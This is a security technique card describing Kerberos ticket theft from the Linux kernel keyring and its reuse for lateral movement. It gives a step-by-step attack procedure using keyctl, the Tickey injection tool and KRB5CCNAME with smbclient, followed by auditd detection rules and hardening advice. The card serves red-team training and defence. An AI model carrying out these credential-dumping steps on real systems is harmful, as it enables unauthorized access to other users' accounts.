# [CA-KERB-015]: CCACHE Keyring Ticket Reuse (Linux)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-015 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access / Lateral Movement |
| **Platforms** | Linux / Unix |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Linux systems integrated with AD often use the Kernel Keyring to store Kerberos tickets (`KEYRING:persistent:%{uid}`). Attackers with root access can dump these keys from kernel memory or use tools to extract them into standard CCACHE files for reuse.
- **Attack Surface:** Linux Kernel Keyring.
- **Business Impact:** **Lateral Movement**. Reusing a valid TGT from a logged-in administrator to access other resources.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Root.
- **Vulnerable Config:** Active user sessions with valid Kerberos tickets.
- **Tools:**
    - [Tickey](https://github.com/TarlogicSecurity/tickey)
    - `keyctl`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration**
Check for keys in the keyring.
```bash
keyctl show
```

**Step 2: Exploitation (Tickey)**
Use Tickey to inject into processes and dump tickets.
```bash
./tickey -i
```
*Output: Wrote ticket to `/tmp/krb5cc_...`*

**Step 3: Reuse**
Set the environment variable to point to the dumped file.
```bash
export KRB5CCNAME=/tmp/krb5cc_1000
# Verify
klist
# Access
smbclient -k //server/share
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Audit
| Source | Event ID | Filter Logic |
|---|---|---|
| **Auditd** | `SYSCALL` | `exe="/usr/bin/keyctl"`, `key_id` access. |
| **Auditd** | `ptrace` | Process injection into `sssd` or other users' shells. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Hardening:** Restrict root access.
*   **Ticket Lifetime:** Reduce Kerberos ticket lifetime to minimize the reuse window.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-004] (Compromise Linux Host)
> **Next Logical Step:** [LAT-SMB-001]
